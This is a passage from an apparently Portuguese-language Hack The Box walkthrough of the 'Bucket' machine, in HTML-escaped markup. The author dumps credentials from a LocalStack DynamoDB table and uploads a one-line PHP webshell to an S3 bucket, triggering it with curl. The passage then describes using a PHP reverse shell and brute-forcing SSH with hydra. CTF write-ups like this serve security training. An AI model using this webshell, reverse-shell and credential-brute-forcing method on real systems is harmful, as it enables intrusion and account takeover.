&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/shell


&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://s3.bucket.htb/shell/
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
&amp;lt;html itemscope &lt;span class=&quot;nv&quot;&gt;itemtype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schema.org/Product&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
  &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;title&amp;gt;AWS Console&amp;lt;/title&amp;gt;
    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Application &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como a última chamada (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -L http://s3.bucket.htb/shell/&lt;/code&gt;) retornou o conteúdo de uma página HTML, refiz a requisição no navegador e notei que estava acessando à página do &lt;strong&gt;DynamoDB Web Shell&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Pesquisando um pouco pude chegar à conclusão de que estávamos utilizando um emulador de storage da AWS, possivelmente uma instancia do &lt;a href=&quot;https://github.com/localstack/localstack&quot;&gt;Localstack&lt;/a&gt;, muito popular entre desenvolvedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6J27Miv.png&quot; alt=&quot;DynamoDB Web Shell - Bucket HTB&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Brincando com alguns dos exemplos da página, consegui listar algumas informações da instancia (ListTables e DescribeTable), conforme abaixo, onde podemos listar algumas informações como a região do serviço (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;us-east-1&lt;/code&gt;) e uma tabela chamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users&lt;/code&gt; no DynamoDB, assim como o seu respectivo resource name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arn:aws:dynamodb:us-east-1:000000000000:table/users&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cKIzAtd.png&quot; alt=&quot;DynamoDB Web Shell - List - Bucket HTB&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Considerando que estamos falando de uma instância do LocalStack, descobri que é possível utilizar o &lt;a href=&quot;https://aws.amazon.com/cli&quot;&gt;awscli&lt;/a&gt;, utilitário de linha de comando da AWS, para se conectar à esta instância local, conforme post &lt;a href=&quot;https://reflectoring.io/aws-localstack/&quot;&gt;Local Development with AWS on LocalStack (reflectoring.io)&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Como o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt; é mais flexível para enumerar e trabalhar com os recursos do que o DynamoDB Web Shell, segui para a instalação via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt&lt;/code&gt; e sua conexão utilizando as informações obtidas no post acima citado, o qual foi executado conforme abaixo. Para as credenciais, quaisquer valores são válidos, uma vez que não se trata de uma instância real em execução na AWS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Install aws cli&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;awscli &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws configure &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb                                                                         
AWS Access Key ID &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: dummy
AWS Secret Access Key &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: dummy
Default region name &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]: us-east-1
Default output format &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lendo a documentação do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awscli&lt;/code&gt; para o DynamoDB, executei algumas consultas simples para listar as tabelas e entradas existentes, conforme abaixo, onde pude obter alguns usuários e senhas que poderão ser úteis futuramente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws dynamodb list-tables &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;TableNames&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;users&quot;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws dynamodb scan &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; json
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;Items&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Management@#1@#&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Mgmt&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Welcome123!&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Cloudadm&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;n2vM-&amp;lt;_K_Q:.Aa2&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
      &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Sysadm&quot;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;Count&quot;&lt;/span&gt;: 3,
  &lt;span class=&quot;s2&quot;&gt;&quot;ScannedCount&quot;&lt;/span&gt;: 3,
  &lt;span class=&quot;s2&quot;&gt;&quot;ConsumedCapacity&quot;&lt;/span&gt;: null
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como sabemos que temos um &lt;strong&gt;s3&lt;/strong&gt; também em execução, enumerei algumas informações sobre os containers blob existentes, onde foi encontrado o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adserver&lt;/code&gt; (o que já tínhamos uma ideia por conta da URL das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
2021-02-26 11:48:02 adserver

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
                           PRE images/
2021-02-26 11:50:04       5344 index.html

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver/images/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
2021-02-26 11:52:02      37840 bug.jpg
2021-02-26 11:52:02      51485 cloud.png
2021-02-26 11:52:02      16486 malware.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;acesso-inicial&quot;&gt;Acesso inicial&lt;/h2&gt;

&lt;p&gt;Uma vez que temos acesso ao blob s3 e sabemos quais conteúdos disponíveis e como utilizá-lo, a primeira coisa a se fazer é realizar o upload de um arquivo para shell reverso. Em primeiro momento vamos validar a possibilidade de utilizar php com um webshell simples conforme abaixo:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após a criação do arquivo, realizado o upload via CLI vide comandos abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb
upload: ./exploit.php to s3://adserver/exploit.php                

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;s3://adserver/              
                           PRE images/
2021-02-26 11:56:28         31 exploit.php
2021-02-26 11:56:02       5344 index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao tentar acessá-lo alguns instantes depois, notei que o arquivo que enviei foi removido por outro processo. Para tentar contornar a questão, configurei para que a chamada de execução de comando fosse realizada assim que o upload fosse finalizado, executando o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;, onde pudemos confirmar o sucesso na tarefa realizada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;aws s3 &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb/exploit.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;upload: ./exploit.php to s3://adserver/exploit.php                
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para um shell reverso, alterei o arquivo a ser enviado de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.php&lt;/code&gt; pelo &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;pentestmonkey/php-reverse-shell (github.com)&lt;/a&gt; que já iniciaria a conexão reversa a um listener previamente definido, sem a necessidade de enviar parâmetros no payload, o qual tivemos sucesso após algumas tentativas.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws s3 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ./exploit.php s3://adserver/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://bucket.htb/exploit.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Uma vez com acesso ao shell da máquina, executei o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; para simplificar a enumeração, onde os seguintes itens foram identificados:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Usuário local &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; possui acesso à máquina e, enumerando seu diretório observado a existencia do arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, o qual não temos acesso leitura com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; além de uma pasta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;project&lt;/code&gt; a ser inspecionada.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Este usuário não possui nenhum processo em execução que eventualmente permita a exploração logo precisaremos obter suas credenciais de alguma forma.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Alguns outros serviços encontram-se em execução nesta máquina, funcionando nas portas 4566, 8000 e 38443, que possivelmente venham a dar privilégios a outras atividades em um segundo momento.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Active Ports                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                               
Active Internet connections (servers and established)                                                     
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name         
tcp        0      0 127.0.0.1:38443         0.0.0.0:*               LISTEN      -                        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                         
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Esta máquina possui serviços de container em execução (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runc&lt;/code&gt;), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Existe um diretório &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled&lt;/code&gt;) onde tínhamos o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000-default.conf&lt;/code&gt; listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; 127.0.0.1:8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IfModule&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; mpm_itk_module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        AssignUserId root root
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IfModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/bucket-app
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
    &lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bucket.htb$
    &lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; /.* http://bucket.htb/ [R]
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ProxyPreserveHost&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;on&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt; / http://localhost:4566/
    &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt; / http://localhost:4566/
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; deny,allow
        &lt;span class=&quot;nc&quot;&gt;Allow&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;ServerAdmin&lt;/span&gt; webmaster@localhost
    &lt;span class=&quot;nc&quot;&gt;ServerName&lt;/span&gt; s3.bucket.htb

    &lt;span class=&quot;nc&quot;&gt;ErrorLog&lt;/span&gt; ${APACHE_LOG_DIR}/error.log
    &lt;span class=&quot;nc&quot;&gt;CustomLog&lt;/span&gt; ${APACHE_LOG_DIR}/access.log combined

&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.&lt;/p&gt;

&lt;p&gt;Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; e felizmente tivemos sucesso. Abaixo a execução do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt; que utilizei para automatizar  brute force na conta via SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; roy &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwords 10.10.10.212 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4 ssh
Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2021-02-26 12:55:36
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~1 try per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.10.10.212:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&amp;lt;_K_Q:.Aa2
1 of 1 target successfully completed, 1 valid password found
